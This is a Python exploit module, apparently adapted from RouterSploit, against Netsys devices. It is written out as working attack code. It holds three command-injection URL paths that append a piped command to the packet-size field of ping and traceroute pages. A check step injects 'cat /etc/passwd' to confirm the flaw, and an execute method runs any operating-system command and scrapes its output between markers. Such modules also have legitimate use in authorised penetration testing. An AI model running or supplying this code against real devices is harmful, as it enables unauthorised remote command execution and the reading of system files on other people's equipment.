# rsf exploit module
# description: Exploits Netsys multiple remote command execution vulnerabilities that allow executing commands on the operating system level.

import re
import socket
import http.client
from urllib.parse import urlparse

class Exploit:
    __info__ = {
        "name": "Netsys Multi RCE",
        "description": "Exploits Netsys multiple remote command execution vulnerabilities that allow executing commands on the operating system level.",
        "authors": (
            "admin <admin[at]bbs.00wz.top>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://bbs.00wz.top/forum.php?mod=viewthread&tid=12630",
        ),
        "devices": (
            "Multiple Netsys",
        ),
    }

    def __init__(self, target_ip, port=9090):
        self.target_ip = target_ip
        self.port = port
        self.valid = None
        self.injections = [
            "/view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
            "/view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
            "/view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1|{}"
        ]

    def http_get(self, path):
        conn = http.client.HTTPConnection(self.target_ip, self.port, timeout=5)
        try:
            conn.request("GET", path)
            response = conn.getresponse()
            data = response.read().decode()
            conn.close()
            return data
        except:
            return None

    def check(self):
        cmd = "cat+/etc/passwd;"
        for injection in self.injections:
            path = injection.format(cmd)
            response = self.http_get(path)
            if response and "/root:" in response:
                self.valid = injection
                return True
        return False

    def execute(self, cmd):
        marker = "marker1234567890"
        cmd = cmd.replace(" ", "+")
        payload = f"echo+{marker};{cmd};echo+{marker};"
        path = self.valid.format(payload)
        response = self.http_get(path)
        if not response:
            return ""
        result = re.findall(f"{marker}(.+?){marker}", response, re.DOTALL)
        return result[0].strip() if result else ""

    def run(self):
        if self.check():
            print("[+] Target seems to be vulnerable")
        else:
            print("[-] Exploit failed - target seems to be not vulnerable")

